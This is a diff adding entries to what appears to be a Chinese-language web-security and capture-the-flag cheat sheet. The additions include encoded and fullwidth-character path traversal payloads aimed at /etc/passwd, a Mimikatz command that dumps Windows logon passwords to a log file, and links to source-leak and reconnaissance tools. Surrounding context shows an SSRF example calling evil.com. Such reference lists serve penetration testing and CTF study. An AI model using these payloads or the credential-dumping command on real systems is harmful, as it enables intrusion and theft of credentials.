@@ -515,6 +515,8 @@ HQL injection example (pwn2win 2017)
     - 僅在5.3.0以下可用
     - magic_quotes_gpc需為OFF
 - `../../../../../../../../../boot.ini/.......................`
+- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`
+- `ＮＮ/ＮＮ/ＮＮ/etc/passwd`
 - `/var/log/apache2/error.log`
 - `/usr/local/apache2/conf/httpd.conf`
 - `/etc/nginx/conf.d/default.conf`
@@ -740,6 +742,11 @@ SSH-2.0-libssh2_1.4.2
     - `tftp://evil.com:5566/TEST`
     - syslog
 
+---
+
+https://github.com/cujanovic/SSRF-Testing
+
+
 # XXE
 
 ## 內部實體
@@ -858,6 +865,8 @@ xxe.dtd:
 
 - X-forwarded-for
 
+- NodeJS unicode failure
+    - `ＮＮ` => `..`
 
 
 # Tool & Online Website
@@ -869,6 +878,8 @@ xxe.dtd:
 - https://www.shodan.io/
 
 - https://www.zoomeye.org/
+
+- https://crt.sh/
 
 - https://www.domainiq.com/reverse_whois
 
@@ -892,3 +903,21 @@ xxe.dtd:
 
 - https://hashkiller.co.uk/
 
+## 其它
+
+- https://3v4l.org/
+    - php eval
+
+- https://github.com/denny0223/scrabble
+    - git
+
+- https://github.com/lijiejie/ds_store_exp
+    - .DS_Store 
+
+- https://github.com/kost/dvcs-ripper
+    - git / svn / hg / cvs ...
+
+- http://www.factordb.com/
+
+- Mimikatz
+    - `mimikatz.exe privilege::debug sekurlsa::logonpasswords full exit >> log.txt`
